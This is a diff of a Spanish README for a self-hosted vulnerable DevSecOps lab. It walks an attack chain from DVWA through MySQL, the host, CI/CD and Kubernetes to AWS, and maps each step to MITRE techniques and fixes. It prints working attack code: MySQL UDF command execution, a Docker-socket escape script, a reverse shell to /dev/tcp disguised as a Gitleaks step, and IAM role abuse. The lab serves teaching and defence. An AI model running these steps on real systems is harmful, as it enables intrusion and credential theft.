@@ -1,7 +1,10 @@
-# DevSecOps Vulnerable Lab — Cadena de Ataque End-to-End & Remediación
+# DevSecOps Vulnerable Lab — Cadena de explotación end-to-end (y su remediación)
 
-> **La seguridad de una infraestructura moderna es una propiedad de su topología, no de sus partes.**
-> Este laboratorio lo demuestra recorriendo, capa a capa, el camino que va desde una subida de fichero en una app web pública hasta el control administrativo total de la cuenta cloud que la sostiene.
+> Laboratorio personal DEV-SEC-OPS que abarca desde la capa cloud en AWS, pasando por Kubernetes, el repositorio de código fuente (Gitea), la pipeline y la aplicación web vulnerable (DVWA) conectada a la base de datos (MySQL). Son seis capas intencionadamente vulnerables con fines demostrativos.
+
+> El objetivo es documentar cómo varias configuraciones inseguras, cada una sin aparente impacto por separado, se combinan para comprometer toda la jerarquía: desde una subida de fichero en una aplicación web hasta el acceso a la cuenta cloud, junto a la versión corregida de cada configuración vulnerable.
+
+> Aisladas, la mayoría de estas malas configuraciones pasaría una revisión sin incidencias. El riesgo aparece cuando las capas tienen conexión entre sí: un rol IAM demasiado abierto no tiene efecto hasta que algo puede alcanzarlo; un `docker.sock` con permisos laxos es inofensivo hasta que un contenedor lo monta.
 
 ![Status](https://img.shields.io/badge/status-active-brightgreen)
 ![License](https://img.shields.io/badge/license-MIT-blue)
@@ -9,8 +12,8 @@
 ![Layers](https://img.shields.io/badge/capas-6-8957e5)
 
 <p align="center">
-  <img src="docs/animations/01-kill-chain.gif" alt="Cadena de ataque completa, animada de DVWA a IaC" width="860">
-  <br><em>De una subida de fichero en DVWA al control total de la cuenta cloud. Ningún paso fue un 0-day.</em>
+  <img src="docs/animations/01-kill-chain.gif" alt="Cadena de ataque completa, de DVWA a IaC" width="860">
+  <br><em>Recorrido de la cadena, capa a capa, desde la subida del fichero en la web DVWA hasta el control a nivel cloud.</em>
 </p>
 
 <!-- GUION · 01-kill-chain.gif -----------------------------------------------
@@ -22,62 +25,28 @@
 
 ---
 
-## La tesis
-
-La mayoría de las auditorías —y de los README de laboratorio— tratan las vulnerabilidades como una lista: un puerto aquí, un rol permisivo allá, un secreto en texto plano más allá. Revisadas de forma aislada, casi todas las piezas de este entorno pasarían el corte. El fallo no vive en ningún fichero: **vive en las relaciones entre ellos.**
-
-Este proyecto existe para hacer visible esa diferencia. No se trata de "hackear DVWA" —DVWA es solo la puerta—, sino de mostrar cómo seis decisiones de configuración *razonables por separado* se encadenan hasta convertirse en un compromiso total. De ahí se derivan las cinco ideas que estructuran todo lo demás:
-
-| # | Abstracción | En una frase |
-|---|---|---|
-| 1 | **El riesgo es emergente, no aditivo** | Las vulnerabilidades se multiplican al tocarse, no se suman. |
-| 2 | **Un ataque recorre fronteras de confianza no verificadas** | Cada capa confió en la anterior sin comprobarla. |
-| 3 | **La superficie visible y la real están inversamente correlacionadas** | Blindas lo que se ve; el agujero está donde no miras. |
-| 4 | **En CI/CD no hay escalada, hay herencia** | El pipeline ya tiene god-mode legítimo; comprometerlo es heredarlo. |
-| 5 | **La misma palanca ataca y defiende** | La reproducibilidad del IaC detona un error —o un fix— en todos los entornos a la vez. |
-
-**Stack:** AWS/LocalStack · Terraform · Ansible · Kubernetes (K3s) · Gitea + Act-Runner · DVWA / MySQL
-
----
-
-## La cadena
-
-Una sola representación canónica. El resto del documento es esta línea, contada despacio.
-
-```
-  1 · DVWA        2 · MySQL       3 · Host        4 · CI/CD       5 · K8s         6 · IaC / Cloud
- ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────────┐
- │ File Up. │──▶│ UDF Abuse│──▶│docker.sock──▶│ Pipeline │──▶│ nsenter  │──▶│  PassRole *  │
- │  + LFI   │   │ sys_eval │   │  (0777)  │   │ Poisoning│   │  PID 1   │   │ AssumeRole * │
- └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────────┘
-   www-data       mysql:999      ROOT host      runner+secrets  cluster-admin   CONTROL TOTAL
-      │              │               │              │               │                 │
-   validación   FILE priv +     socket montado  secretos en    kubeconfig root   roles IAM
-   de upload    creds en        en pod +        texto plano    en /etc/rancher   sobreprivi-
-   insuficiente config.inc.php  privileged      (hostPath)     (host)            legiados
-```
-
-> **Orden = perspectiva del atacante.** Esta secuencia **no** sigue el orden del stack tecnológico (donde K8s está por debajo del CI/CD), sino el orden en que un atacante real la descubre: empezando por lo expuesto a internet y terminando en la infraestructura que lo define. Nadie tiene acceso directo al Terraform; se llega a él atravesando todo lo demás. Que la narrativa respete ese orden es deliberado.
+**Stack:** AWS (Simulación local mediante) LocalStack · Terraform · Ansible · Kubernetes (K3s) · Gitea + Act-Runner · DVWA · MySQL
 
 ---
 
 ## Arquitectura
 
 <details>
-<summary><strong>Mapa, estructura del repo y tabla de controles rotos</strong></summary>
+<summary><strong>Mapa, estructura del repositorio y tabla de controles rotos</strong></summary>
 
-### Mapa mental
+### Mapa de infraestructura
 
-Una VPC con una única subnet pública, una EC2 expuesta directamente a internet, un Security Group sin restricción de origen, un bucket S3 sin bloqueo público y roles IAM sobreprivilegiados. A nivel de host, firewall desactivado y `docker.sock` de escritura para cualquiera. En Kubernetes, el runner de CI/CD corre `privileged` con el socket de Docker del host montado dentro.
+Una VPC con una única subnet pública, una instancia EC2 expuesta directamente a internet, un Security Group sin restricción de origen, un bucket S3 sin bloqueo de acceso público y roles IAM sobreprivilegiados. 
+A nivel de host, el firewall está desactivado y `docker.sock` tiene permisos de escritura para cualquier usuario. En Kubernetes, el runner de CI/CD se ejecuta con `privileged: true` y el socket de Docker del host montado dentro del pod.
 
-Ninguna pieza es grave en solitario. Juntas, forman una ruta directa de la app pública al control del proveedor cloud.
+Ninguna de estas configuraciones es crítica por sí sola. En conjunto, forman una ruta desde la aplicación pública hasta el acceso a la cuenta cloud.
 
 ### Estructura del repositorio
 
 ```
 .
 ├── 01-cloud-iac
-│   ├── hardened/            # Misma infraestructura, endurecida
+│   ├── hardened/            # Misma infraestructura, versión endurecida
 │   └── vulnerable/          # ec2.tf · iam.tf · network.tf · provider.tf · s3.tf
 ├── 02-provisioning
 │   ├── site_hardened.yml
@@ -91,8 +60,6 @@ Ninguna pieza es grave en solitario. Juntas, forman una ruta directa de la app p
         ├── k8s/vulnerable/      # DVWA + MySQL
         └── src/vulnerable/      # Código fuente DVWA
 ```
-
-> El repo mantiene **ambas versiones en paralelo** (`hardened/` y `vulnerable/`) para cada capa: no solo documenta cómo se rompe, sino cómo se arregla.
 
 ### Controles de seguridad rotos
 
@@ -112,12 +79,12 @@ Ninguna pieza es grave en solitario. Juntas, forman una ruta directa de la app p
 | **Aislamiento (contenedor)** | `act-runner.yaml` | `docker.sock` del host montado en el pod | 🔴 Crítica | Capa 4 |
 | **Gestión de secretos** | `gitea-deployment.yaml` | `SECRET_KEY`/`INTERNAL_TOKEN`/`JWT_SECRET` hardcodeados | 🟠 Alta | Capa 4 |
 
-> **\* Impacto condicional.** El SG abierto en el puerto 2375 no es explotable *per se*: depende de que la Docker API escuche efectivamente sin autenticación detrás. Es una vulnerabilidad que **amplifica** el daño de otro hallazgo (el socket `0777`), no una puerta de entrada por sí misma. Este matiz —hallazgo de checklist vs. análisis de riesgo real— es el que separa una auditoría seria de un escáner automático.
+> **\* Nota sobre el puerto 2375.** El Security Group abierto en 2375 no es explotable por sí mismo: requiere que la Docker API escuche efectivamente en ese puerto sin autenticación. En este laboratorio no lo hace por esa vía; la explotación real usa el socket Unix con permisos `0777` de la Capa 3. Se marca como crítico condicional porque amplifica otro hallazgo, no porque sea una vía de entrada independiente. Un escáner automático lo reporta como crítico sin esa distinción; a efectos de priorización, la diferencia es relevante.
 
 ### Configuración vulnerable (extracto)
 
 ```hcl
-# iam.tf — cualquiera puede asumir el rol, pasar cualquier rol, y hay un admin directo
+# iam.tf — cualquier principal puede asumir el rol, pasar cualquier rol, y hay un admin directo
 resource "aws_iam_role" "overprivileged_role" {
   assume_role_policy = jsonencode({ Statement = [{ Action = "sts:AssumeRole", Effect = "Allow", Principal = "*" }] })
 }
@@ -130,10 +97,10 @@ resource "aws_iam_user_policy_attachment" "user_admin_attach" {
 ```
 
 ```yaml
-# site_vulnerable.yml — el punto bisagra entre "acceso al host" y "control de Docker"
+# site_vulnerable.yml — configuración de host que habilita el control de Docker
 - name: Desactivar Firewall (UFW)
   ufw: { state: disabled }
-- name: Socket de Docker expuesto a todos los usuarios (0777)
+- name: Socket de Docker con permisos para todos los usuarios (0777)
   file: { path: /var/run/docker.sock, mode: '0777' }
 ```
 
@@ -141,43 +108,43 @@ resource "aws_iam_user_policy_attachment" "user_admin_attach" {
 
 ---
 
-## Explotación — de DVWA al control total
+## Explotación de la cadena
 
-> ⚠️ **Aviso legal y ético.** Todo esto se ejecuta en un entorno aislado (red local + LocalStack), sin conexión a producción ni a terceros, sobre infraestructura propia desplegada con fines educativos. Reproducir estas técnicas contra sistemas sin autorización explícita es ilegal.
+> **Aviso legal y ético.** Todo el ejercicio se ejecuta en un entorno aislado (red local + LocalStack), sin conexión a producción ni a terceros, sobre infraestructura propia desplegada con fines educativos. Reproducir estas técnicas contra sistemas sin autorización explícita del propietario es ilegal.
 
-**Prerrequisitos para seguir la sección:** SQL, PHP, Bash/Python y manifiestos K8s a nivel básico; contenedores, orquestación e IaC a nivel conceptual; el lab desplegado (sección de Despliegue) con conectividad Kali (`192.168.252.20`) ↔ clúster (`192.168.252.10`).
+Para seguir la sección conviene manejar SQL, PHP, Bash/Python y manifiestos de Kubernetes a nivel básico, entender contenedores, orquestación e IaC a nivel conceptual, y tener el laboratorio desplegado (ver Despliegue) con conectividad entre Kali (`192.168.252.20`) y el clúster (`192.168.252.10`).
 
 <p align="center">
-  <img src="docs/animations/02-progress.gif" alt="Barra de progreso de la cadena avanzando capa a capa" width="720">
-  <br><em>El estado de la cadena a medida que cae cada capa.</em>
+  <img src="docs/animations/02-progress.gif" alt="Progreso de la cadena, capa a capa" width="720">
+  <br><em>Estado de la cadena a medida que se compromete cada capa.</em>
 </p>
 
 <!-- GUION · 02-progress.gif ------------------------------------------------
      La línea `[✓] DVWA → [✓] MySQL → ...` marcándose sola, un tick por capa,
-     sincronizada con el scroll de las 5 subsecciones. Opcional. ~6 s.
+     sincronizada con el scroll de las 6 subsecciones. Opcional. ~6 s.
 ------------------------------------------------------------------------------>
 
 <details open>
 <summary><strong>Capa 1 · Acceso inicial — DVWA</strong></summary>
 
-DVWA expone tres vectores directos: SQLi, Command Injection y File Upload/LFI. Se evaluaron los tres y se eligió **File Upload + LFI** por una razón concreta: da una **shell interactiva completa** (PHP arbitrario en el servidor), mientras que la SQLi habría quedado limitada a extracción de datos, sin ejecución de comandos. Para pivotar entre capas, una shell da mucho más control que una inyección ciega.
+DVWA ofrece tres vectores de entrada directos: SQLi, Command Injection y File Upload/LFI. Se usa la combinación File Upload + LFI porque proporciona ejecución de PHP arbitrario en el servidor, es decir, una shell interactiva. La SQLi se habría limitado a extracción de datos, sin ejecución; para pivotar entre capas, una shell da más margen que una inyección ciega.
 
-**Lo que no funcionó (y por qué documentarlo importa).** Antes de decidir por dónde pivotar, se comprobó sistemáticamente si el propio contenedor de DVWA permitía escalar. No permitía nada:
+Antes de plantear el pivote se comprueba si el propio contenedor de DVWA permite escalar. No hay ningún vector local aprovechable:
 
 ```bash
 whoami                                   # → www-data
 sudo -l                                  # → sudo: command not found
 getcap -r / 2>/dev/null                  # → (vacío: sin binarios con capabilities)
 grep Cap /proc/self/status               # → CapEff: 0000000000000000
-ls -la /var/run/docker.sock              # → No such file or directory
+ls -la /var/run/docker.sock             # → No such file or directory
 cat /proc/mounts                         # → solo montajes estándar de K8s, sin binds del host
 ls /var/run/secrets/.../serviceaccount/  # → token presente, pero localsubjectrulesreviews → 403
 env                                      # → solo variables de Apache, sin credenciales
 ```
 
-> **Conclusión:** el contenedor de DVWA está **correctamente aislado**. Documentar un negativo no es relleno —es la prueba de que la enumeración fue método, no suerte— y justifica el siguiente pivote en vez de asumirlo.
+El contenedor de DVWA está correctamente aislado. La enumeración se documenta de forma explícita porque confirma que no hay nada aprovechable a nivel local y justifica que el siguiente movimiento sea lateral, hacia otra capa, en lugar de una escalada dentro del contenedor.
 
-**El hallazgo decisivo** no vino del escaneo de red (hecho íntegramente en PHP, sin `nmap`), sino de un fichero de configuración de la propia aplicación:
+El dato que permite continuar no proviene de un escaneo de red (realizado íntegramente en PHP, sin `nmap`), sino de un fichero de configuración de la aplicación:
 
 ```bash
 cat /var/www/html/config/config.inc.php
@@ -201,15 +168,14 @@ php -r '$c=new mysqli("mysql-service","app","vulnerables"); $r=$c->query("SHOW G
 | Discovery | Network Service Discovery | T1046 | NetworkPolicy entre namespaces |
 | Credential Access | Credentials in Files | T1552.001 | Secretos en Vault/Secrets Manager, nunca en ficheros de app |
 
-> ### 💡 Insight — Capa 1
-> La superficie más peligrosa de un entorno real no suele ser el código vulnerable: **son los secretos mal gestionados en ficheros de configuración.** Y el riesgo no estaba en la puerta (DVWA), sino en cómo la puerta se conecta con lo que hay detrás. *Si no es aquí, ¿dónde?* — esa pregunta es la que dirige todo lo que sigue.
+> **Nota.** El acceso inicial se obtiene a través de la aplicación web, pero el dato que permite continuar es la contraseña de la base de datos almacenada en texto plano en `config.inc.php`. Los secretos en ficheros de configuración son un vector de credential access habitual, independiente de la calidad del código de la aplicación.
 
 </details>
 
 <details>
-<summary><strong>Capa 2 · Pivote a MySQL + escape al host</strong></summary>
+<summary><strong>Capa 2 · Pivote a MySQL — UDF Abuse</strong></summary>
 
-El diseño coloca deliberadamente el eslabón débil en el pod de **MySQL**, no en DVWA. El manifiesto lo confirma:
+El pod de **MySQL** está configurado con `privileged: true`, la capability `SYS_ADMIN` y el socket de Docker del host montado dentro del contenedor. El montaje del socket se utiliza en la Capa 3; en esta capa el objetivo es obtener ejecución de comandos dentro del contenedor de MySQL.
 
 ```yaml
 # mysql-deployment (vulnerable)
@@ -223,7 +189,7 @@ volumes:
     name: docker-sock
 ```
 
-**UDF Abuse — no es "ejecutar un script".** Requiere privilegio `FILE`, conocer la ruta exacta del `plugin_dir` y una `.so` compatible con la arquitectura. Los tres pasos, lanzados desde la shell de DVWA como `www-data`:
+**UDF Abuse.** La técnica requiere el privilegio `FILE`, conocer la ruta exacta del `plugin_dir` y disponer de una librería `.so` compatible con la arquitectura. Los tres pasos se lanzan desde la shell de DVWA como `www-data`:
 
 ```php
 // 1 — Subir la librería UDF a una tabla auxiliar (hex)
@@ -235,17 +201,35 @@ $c->query("INSERT INTO udf_blob VALUES(UNHEX('".bin2hex($so)."'))");
 // 2 — Volcar la .so al plugin_dir
 $c->query("SELECT line FROM udf_blob INTO DUMPFILE '/usr/lib64/mysql/plugin/udf_sys.so'");
 
-// 3 — Registrar sys_eval y confirmar RCE
+// 3 — Registrar sys_eval y confirmar la ejecución de comandos
 $c->query("CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf_sys.so'");
 $r = $c->query("SELECT sys_eval('id') AS cmd")->fetch_assoc();
 // → uid=999(mysql) gid=999(mysql)
 ```
 
-**Escape al host vía Docker Engine API sobre el socket Unix.** Sin CLI de Docker, sin `curl`: se habla el protocolo REST a mano.
+En este punto se dispone de ejecución de comandos dentro del contenedor de MySQL, con el usuario `mysql` (uid 999). El escape al host se desarrolla en la Capa 3.
+
+#### Ficha de riesgo — MySQL
+
+| Táctica | Técnica | ID | Mitigación |
+|---|---|---|---|
+| Execution | Exploitation for Client Execution (UDF Abuse) | T1203 | Restringir el privilegio `FILE`; `secure_file_priv` acotado |
+| Credential Access | Credentials in Files | T1552.001 | Credenciales de BD fuera de ficheros de aplicación |
+
+> **Nota.** El acceso a MySQL usa las credenciales obtenidas en la Capa 1, no una vulnerabilidad de la base de datos. El privilegio `FILE`, junto con un `plugin_dir` escribible, es suficiente para cargar una UDF y ejecutar comandos del sistema.
+
+</details>
+
+<details>
+<summary><strong>Capa 3 · Escape al host vía docker.sock</strong></summary>
+
+El pod de MySQL tiene montado `/var/run/docker.sock` (ver el manifiesto de la Capa 2). Con ejecución de comandos como `mysql`, ese socket permite crear contenedores en el daemon de Docker del host y, con ellos, salir del contenedor. Es la parte técnicamente más delicada de la cadena.
+
+La imagen de MySQL no incluye la CLI de Docker ni `curl`, por lo que las peticiones al Docker Engine API se construyen a mano sobre el socket Unix, usando el módulo `socket` de Python.
 
 <p align="center">
   <img src="docs/animations/03-docker-escape.gif" alt="Escape de contenedor a root en el host vía docker.sock" width="820">
-  <br><em>El momento más denso: contenedor MySQL → contenedor efímero con <code>Binds: /:/mnt/host</code> → root en el nodo real.</em>
+  <br><em>Contenedor MySQL → contenedor efímero con <code>Binds: /:/mnt/host</code> → root en el nodo.</em>
 </p>
 
 <!-- GUION · 03-docker-escape.gif -------------------------------------------
@@ -270,37 +254,32 @@ s2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s2.connect("/var/run/doc
 s2.sendall(b"POST /containers/escape1/start HTTP/1.1\r\nHost: localhost\r\n\r\n")
 ```
 
-<details>
-<summary>Por qué el payload es así (decisiones de diseño, no casualidad)</summary>
+Varios campos del payload resuelven fallos que no producen ningún mensaje de error, solo la ausencia del resultado esperado:
 
-- **`alpine` y no `mysql:5.7`** — la imagen de MySQL no trae `mount`/`chroot`/`nsenter`; Alpine sí.
-- **`NetworkMode: host`** — sin esto el contenedor efímero cae en la bridge por defecto (`172.17.0.0/16`) y la reverse shell hacia `192.168.252.20` muere en silencio por el NAT. Con `host`, comparte la pila de red sin NAT.
-- **`Binds: ["/:/mnt/host"]` y no `mount --bind`** — `Binds` lo resuelve el *daemon* antes de arrancar; hacerlo a mano dentro del comando genera conflictos de punto de montaje y exige `mount` en la imagen.
-- **Base64** — evita el infierno de quoting anidado que hace el script frágil.
-- **Sin f-strings** — el contenedor de MySQL corre Python 2. Concatenación con `+`.
+- **`alpine` en lugar de `mysql:5.7`.** La imagen de MySQL es mínima y no incluye `mount`, `chroot` ni `nsenter`; Alpine sí. Se puede comprobar qué binarios trae una imagen arrancando un contenedor efímero con `which mount chroot nsenter` como comando y leyendo sus logs.
+- **`NetworkMode: host`.** Sin este parámetro, el contenedor efímero queda en la bridge por defecto (`172.17.0.0/16`) y la reverse shell hacia `192.168.252.20` sale por el NAT de Docker, sin alcanzar el destino y sin producir error. Con `host`, el contenedor comparte la pila de red del nodo, sin NAT, y la conexión saliente funciona.
+- **`Binds: ["/:/mnt/host"]` en lugar de `mount --bind`.** El daemon resuelve `Binds` antes de arrancar el contenedor; hacerlo manualmente dentro del comando genera conflictos de punto de montaje y requiere `mount` en la imagen.
+- **Base64.** Evita el quoting anidado entre PHP, el JSON y la shell del contenedor, que rompía el script de forma inconsistente.
+- **Sin f-strings.** El contenedor de MySQL ejecuta Python 2; la concatenación de cadenas se hace con `+`.
 
-</details>
+Cuando la conexión llega al `nc -lvnp 5555`, la shell es root en el host, no en un contenedor: el `chroot` al filesystem del host montado hace que el entorno sea el del anfitrión.
 
-Si la conexión llega al `nc -lvnp 5555`, la shell es **root en el host real**, no en un contenedor: el `chroot` al filesystem del host montado convierte el entorno en el del anfitrión.
-
-#### Ficha de riesgo — MySQL / Escape
+#### Ficha de riesgo — Escape al host
 
 | Táctica | Técnica | ID | Mitigación |
 |---|---|---|---|
-| Execution | Exploitation for Client Execution (UDF Abuse) | T1203 | Restringir `FILE` priv; `secure_file_priv` acotado |
-| Privilege Escalation | Escape to Host | T1611 | Nunca montar `docker.sock` en pods; rootless / gVisor |
-| Privilege Escalation | Container Privileged | T1548 | Prohibir `privileged`/`SYS_ADMIN` vía PSA / OPA |
+| Privilege Escalation | Escape to Host | T1611 | No montar `docker.sock` en pods; runtime rootless / gVisor |
+| Privilege Escalation | Abuse Elevation Control: Container Privileged | T1548 | Prohibir `privileged`/`SYS_ADMIN` mediante PSA / OPA |
 | Lateral Movement | Container Administration Command | T1021.007 | TLS mutuo obligatorio en el Docker Engine API |
 
-> ### 💡 Insight — Capa 2
-> Mínimo privilegio no es una regla que se aplica: es **una pregunta que se hace**. *¿Qué razón legítima tiene un servicio de base de datos para hablar con el daemon de Docker?* Ninguna. Cada permiso que no responde a una necesidad concreta es una frontera de confianza regalada — y el aislamiento del contenedor era una promesa, no un muro. `docker.sock` lo volvió decorativo.
+> **Nota.** Un contenedor de base de datos no requiere acceso al daemon de Docker. Montar `/var/run/docker.sock` dentro del pod equivale a conceder control del host, con independencia del resto de restricciones del contenedor. El montaje procedía de una configuración para builds locales y no se retiró al desplegar en el clúster; en los manifiestos el contenedor sigue pareciendo aislado.
 
 </details>
 
 <details>
-<summary><strong>Capa 3 · CI/CD — Gitea / Act-Runner</strong></summary>
+<summary><strong>Capa 4 · CI/CD — Gitea / Act-Runner</strong></summary>
 
-Con root en el host, sus datos —persistidos vía `hostPath`— son directamente legibles:
+Con root en el host, los datos de Gitea (persistidos mediante `hostPath`) son legibles directamente:
 
 ```bash
 cat /var/lib/gitea-data/app.ini
@@ -309,9 +288,9 @@ cat /var/lib/gitea-data/app.ini
 # [oauth2]   JWT_SECRET = eyJhbGci...
 ```
 
-`SECRET_KEY` cifra las cookies de sesión, `INTERNAL_TOKEN` autentica la comunicación interna, `JWT_SECRET` firma los tokens OAuth2. Con cualquiera en texto plano, un atacante **forja sesiones o tokens válidos sin credenciales de ningún usuario**. El manifiesto del runner, además, expone su token de registro en el propio comando de arranque.
+`SECRET_KEY` cifra las cookies de sesión, `INTERNAL_TOKEN` autentica la comunicación interna y `JWT_SECRET` firma los tokens OAuth2. Con cualquiera de los tres en texto plano es posible forjar sesiones o tokens válidos sin credenciales de usuario. Además, el manifiesto del runner expone su token de registro en el comando de arranque.
 
-**Poisoned Pipeline Execution (PPE).** No es "modificar un YAML": es que el runner ejecuta código arbitrario en el **mismo contexto** que los jobs legítimos —con `docker.sock` del host y `privileged: true`—. El vector se disfraza de paso inofensivo:
+**Poisoned Pipeline Execution (PPE).** El runner ejecuta los jobs en el mismo contexto que los legítimos (con `docker.sock` del host y `privileged: true`), por lo que basta con introducir una línea en un workflow. El paso se presenta como una tarea habitual:
 
 ```yaml
 - name: Gitleaks Scan
@@ -321,7 +300,7 @@ cat /var/lib/gitea-data/app.ini
     gitleaks detect --source="."   # → decodificado: bash -i >& /dev/tcp/192.168.252.20/4488 0>&1
 ```
 
-El base64 + `continue-on-error` no es casualidad: una revisión superficial de PR ve "escaneo de secretos", no una reverse shell, y el pipeline se reporta verde.
+La combinación de `base64` y `continue-on-error` tiene un efecto concreto: en una revisión de PR superficial el paso aparece como un escaneo de secretos, el pipeline se reporta correctamente y la reverse shell arranca en segundo plano.
 
 #### Ficha de riesgo — CI/CD
 
@@ -332,23 +311,22 @@ El base64 + `continue-on-error` no es casualidad: una revisión superficial de P
 | Persistence | Compromise Infrastructure: CI/CD | T1584 | Runners efímeros, sin `privileged` ni socket |
 | Defense Evasion | Obfuscated Files or Information | T1027 | Escaneo estático de workflows (patrón `base64 -d \| sh`) |
 
-> ### 💡 Insight — Capa 3
-> Aquí el concepto de "escalada de privilegios" se disuelve: **no hay escalada, hay herencia.** El pipeline ya tenía acceso *legítimo* a todo lo que necesita para desplegar —`kubeconfig`, credenciales cloud, claves de firma—. El atacante no explota nada nuevo: hereda exactamente el poder del proceso de despliegue. En la práctica, **la seguridad del CI/CD *es* la seguridad de toda la infraestructura que gestiona.**
+> **Nota.** El runner dispone por diseño de las credenciales de despliegue: `kubeconfig`, credenciales cloud y claves de firma. Comprometerlo no requiere ninguna técnica de escalada nueva: hereda los privilegios que el proceso de despliegue ya tiene. El nivel de acceso del CI/CD equivale al de la infraestructura que gestiona y debería tratarse como un componente de producción en el modelo de amenazas.
 
 </details>
 
 <details>
-<summary><strong>Capa 4 · Kubernetes (K3s)</strong></summary>
+<summary><strong>Capa 5 · Kubernetes (K3s)</strong></summary>
 
-**Dos vías, no una.** El `kubeconfig` de `cluster-admin` es legible desde el host (`/etc/rancher/k3s/k3s.yaml`) tras el escape de la Capa 2; alternativamente, el Act-Runner suele tener credenciales de despliegue equivalentes inyectadas como secreto. Documentar ambas importa porque en un entorno real rara vez se dispone de las dos.
+Hay dos formas de llegar al clúster; en un entorno real rara vez se dispone de las dos a la vez. La primera: el `kubeconfig` de `cluster-admin` es legible desde el host (`/etc/rancher/k3s/k3s.yaml`) tras el escape de la Capa 3. La segunda: el Act-Runner suele llevar credenciales de despliegue equivalentes inyectadas como secreto.
 
-**Pod malicioso + salto al PID 1 del host:**
+**Pod con acceso al PID 1 del host:**
 
 ```yaml
 # malicious-pod.yaml
 apiVersion: v1
 kind: Pod
-metadata: { name: pwned-node }
+metadata: { name: node-access-pod }
 spec:
   hostNetwork: true
   hostPID: true
@@ -362,16 +340,16 @@ spec:
 ```
 
 <p align="center">
-  <img src="docs/animations/04-nsenter.gif" alt="Salto al namespace PID 1 del host vía nsenter" width="820">
-  <br><em><code>nsenter -t 1 -m -u -i -n sh</code>: entrar al namespace del init es indistinguible de una sesión root nativa en el nodo.</em>
+  <img src="docs/animations/04-nsenter.gif" alt="Acceso al namespace PID 1 del host vía nsenter" width="820">
+  <br><em><code>nsenter -t 1 -m -u -i -n sh</code>: entrar al namespace del proceso init equivale a una sesión root en el nodo.</em>
 </p>
 
 <!-- GUION · 04-nsenter.gif -------------------------------------------------
-     El pod `pwned-node` aplicándose; flecha desde el contenedor al proceso
+     El pod `node-access-pod` aplicándose; flecha desde el contenedor al proceso
      PID 1 del host; el prompt se convierte en root del nodo. ~10 s.
 ------------------------------------------------------------------------------>
 
-**El hallazgo de `state.db` (Kine).** K3s no usa `etcd` por defecto, sino **Kine** sobre SQLite en disco. Los Secrets están ahí en base64 y **sin cifrado en reposo** salvo que se active `--secrets-encryption`:
+Un segundo hallazgo es `state.db`. K3s no usa `etcd` por defecto, sino Kine sobre SQLite, en disco. Los Secrets están ahí en base64 y sin cifrado en reposo, salvo que se haya activado `--secrets-encryption`, que no está habilitado por defecto.
 
 ```bash
 sqlite3 /var/lib/rancher/k3s/server/db/state.db "SELECT name,value FROM kine WHERE name LIKE '%secrets%';"
@@ -387,15 +365,14 @@ echo "<valor>" | base64 -d        # incluidas las credenciales AWS que usa el CI
 | Discovery | Permission Groups Discovery: K8s | T1069.003 | RBAC de mínimo privilegio; auditoría de bindings a `cluster-admin` |
 | Impact | Data Encrypted/Destruction (potencial) | T1486/T1485 | Backups inmutables; alertas sobre pods `privileged` |
 
-> ### 💡 Insight — Capa 4
-> **Kubernetes añade abstracción, no aislamiento.** Un pod `privileged: true` + `hostPath: /` es funcionalmente idéntico a root en el nodo, solo que con más YAML de por medio. La orquestación da una falsa sensación de contención que muchos equipos no cuestionan hasta que alguien la atraviesa.
+> **Nota.** Un pod con `privileged: true` y `hostPath: /` tiene acceso equivalente a root en el nodo. La abstracción que introduce Kubernetes no aporta aislamiento adicional frente al host cuando se permiten estas opciones; el control se ejerce mediante Pod Security Admission o políticas equivalentes.
 
 </details>
 
 <details>
-<summary><strong>Capa 5 · IaC / Cloud — el objetivo final</strong></summary>
+<summary><strong>Capa 6 · IaC / Cloud</strong></summary>
 
-Con las credenciales AWS extraídas de Kine (o del runner), los tres hallazgos leídos en el código de la Arquitectura ahora se **demuestran en explotación real**:
+Con las credenciales AWS obtenidas de Kine (o del runner), los tres hallazgos que ya se leían en el código de la sección de Arquitectura pasan de configuración a explotación:
 
 ```bash
 export AWS_ACCESS_KEY_ID=<extraído>; export AWS_SECRET_ACCESS_KEY=<extraído>
@@ -405,26 +382,25 @@ aws iam list-attached-user-policies --user-name dev-user-admin --endpoint-url=..
 # → arn:aws:iam::aws:policy/AdministratorAccess
 
 aws sts assume-role --role-arn arn:aws:iam::000000000000:role/devsecops-unrestricted-role \
-  --role-session-name pwn --endpoint-url=...        # → éxito: trust policy Principal: "*"
+  --role-session-name lab-session --endpoint-url=...   # → éxito: trust policy Principal: "*"
 
 aws s3 cp ./payload.txt s3://devsecops-public-data-bucket/ --no-sign-request   # sin credenciales
 ```
 
-**Por qué `iam:PassRole` sin restricción es crítico y no "más de lo mismo".** No es tener permisos altos: es la capacidad de **asignar cualquier rol de la cuenta a cualquier servicio**. Es escalada permanente y, a diferencia de un `AdministratorAccess` visible, casi indetectable en auditoría superficial: el usuario parece de bajo privilegio pero puede *convertirse* en cualquier rol bajo demanda.
+De los tres hallazgos, `iam:PassRole` sin `Resource` acotado tiene una consideración particular. No consiste en tener permisos elevados, sino en poder asignar cualquier rol de la cuenta a cualquier servicio, lo que constituye una vía de escalada persistente. Un `AdministratorAccess` adjunto es visible en la primera auditoría; un usuario que aparenta bajo privilegio pero puede asumir cualquier rol bajo demanda es más difícil de detectar.
 
-**El cierre del círculo.** Cada configuración que hizo posible la cadena —el SG abierto, el `docker.sock` en `0777`, los pods `privileged`— se desplegó **desde aquí**, de forma automatizada, vía Terraform y Ansible. El IaC no es solo el objetivo final: es también el origen de todas las condiciones que lo permitieron.
+Todas las condiciones que hacen posible la cadena (el Security Group abierto, el `docker.sock` en `0777`, los pods `privileged`) se despliegan desde este mismo Terraform de forma automatizada. El IaC es la última capa de la cadena y, a la vez, el origen de las condiciones de las capas anteriores.
 
 #### Ficha de riesgo — IaC / Cloud
 
 | Táctica | Técnica | ID | Mitigación |
 |---|---|---|---|
-| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 | IAM mínimo privilegio; revisión de `AdministratorAccess` |
-| Privilege Escalation | PassRole (IAM) | T1548 | `Resource` acotado en toda policy con `iam:PassRole` |
+| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 | IAM de mínimo privilegio; revisión de `AdministratorAccess` |
+| Privilege Escalation | Abuse Elevation Control: PassRole | T1548 | `Resource` acotado en toda policy con `iam:PassRole` |
